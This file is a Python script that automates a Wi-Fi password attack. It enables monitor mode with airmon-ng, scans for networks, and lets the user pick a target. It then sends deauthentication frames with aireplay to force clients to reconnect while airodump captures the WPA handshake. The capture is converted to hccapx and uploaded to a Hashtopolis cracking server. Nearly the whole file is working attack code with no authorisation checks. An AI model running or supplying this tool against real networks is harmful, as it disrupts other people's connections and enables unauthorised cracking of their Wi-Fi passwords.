import os
import random
import subprocess
import time
import pandas
from pandas import DataFrame, read_csv
from subprocess import PIPE
from time import sleep

from AireplayThread import AireplayThread
from AirodumpThread import AirodumpThread
from hashtopolisUploader import HashToPolisUploader
from hccapxConverter import HccapxConverter
from parseOutput import AiroParser

airmon_cmd_template = 'airmon-ng'
PATH = os.environ['PATH']
env = {'PATH': PATH, 'MON_PREFIX': 'smoothie'}


def startInterface(interface):
    airmon_cmd = list()
    airmon_cmd.append(airmon_cmd_template)
    airmon_cmd.append('start')
    airmon_cmd.append(interface)

    print(airmon_cmd)

    airmon_process = subprocess.Popen(airmon_cmd, stdout=PIPE, stderr=PIPE, env=env)

    try:
        outs, errs = airmon_process.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        airmon_process.kill()
        outs, errs = airmon_process.communicate()

    err_str = errs.decode('utf-8')
    out_str = outs.decode('utf-8')

    print(out_str)

    interface_success = interface + 'mon'

    if interface_success in out_str:
        return True
    else:
        return False


def stopInterface(interface):
    interface = interface + 'mon'
    airmon_cmd = list()
    airmon_cmd.append(airmon_cmd_template)
    airmon_cmd.append('stop')
    airmon_cmd.append(interface)

    airmon_process = subprocess.Popen(airmon_cmd, stdout=PIPE, stderr=PIPE, env=env)

    try:
        outs, errs = airmon_process.communicate(timeout=15)
    except subprocess.TimeoutExpired:
        airmon_process.kill()
        outs, errs = airmon_process.communicate()

    err_str = errs.decode('ascii')
    out_str = outs.decode('ascii')

    print(out_str)

    interface_success = interface

    if interface_success in out_str:
        return True
    else:
        return False


def getRandomName():
    return ''.join(random.choice('0123456789ABCDEF') for i in range(5))

def ask_for_network(parser):
    print('Please select your desired network')
    for idx, net in enumerate(parser.available_bssids):
        print('{0}) {1} | {2}'.format(idx, net, parser.available_ESSID[idx]))

    try:
        selected = int(input())
    except ValueError:
        print('Input is not a number')
        exit(-1)

    return selected

def main():
    interface = 'wlan1'
    print('Starting...')
    if startInterface(interface):
        # continue, because airmon was successful
        output_name = 'output-{}'.format(getRandomName())
        scanning_arg_list = list()
        scanning_arg_list.append('--write')
        scanning_arg_list.append(output_name)
        scanning_arg_list.append('--output-format')
        scanning_arg_list.append('csv')

        scanning_thread = AirodumpThread(1, interface, scanning_arg_list)
        scanning_thread.setDaemon(True)
        scanning_thread.start()

        startTime = time.time()
        print()
        print('Giving airodump time to capture', end='', flush=True)
        while time.time() - startTime <= 10:
            print('.', end='', flush=True)
            sleep(2)
        print()

        scanning_thread.stop()

        sleep(1)
        if not scanning_thread.is_alive():
            print("Successfully stopped thread with id {}".format(scanning_thread.thread_id))

        fileName = output_name + '-01.csv'

        parser = AiroParser(fileName)
        parser.pandaParse()

        selected = ask_for_network(parser)

        capture_output_name = 'capture-{}'.format(getRandomName())
        capture_arg_list = list()
        capture_arg_list.append('--write')
        capture_arg_list.append(capture_output_name)
        capture_arg_list.append('--channel')
        capture_arg_list.append(str(parser.available_channels[selected]))
        capture_arg_list.append('--bssid')
        capture_arg_list.append(parser.available_bssids[selected])

        print(capture_arg_list)

        capture_thread = AirodumpThread(2,interface,capture_arg_list)
        print('Starting thread to capture handshake!')
        capture_thread.start()

        deauth_thread = AireplayThread(3, interface, parser.available_bssids[selected])
        deauth_thread.setDaemon(True)
        deauth_thread.start()

        startTime = time.time()
        print()
        print('Giving aireplay time to deauth...', end='', flush=True)
        while time.time() - startTime <= 5:
            print('.', end='', flush=True)
            sleep(2)
        print()

        deauth_thread.stop()

        startTime = time.time()
        print()
        print('Giving airodump time to capture...', end='', flush=True)
        while time.time() - startTime <= 30:
            print('.', end='', flush=True)
            sleep(2)
        print()

        capture_thread.stop()
        sleep(1)

        converter = HccapxConverter()
        success = converter.convert(capture_output_name,capture_output_name)
        print(success)
        if success:
            print('Successfully converted cap file to hccapx format. Now uploading...')
            uploader = HashToPolisUploader()
            uploader.upload(capture_output_name+'.hccapx')

    else:
        print('Error starting interface {0}'.format(interface))
        return -1


if __name__ == '__main__':
    main()
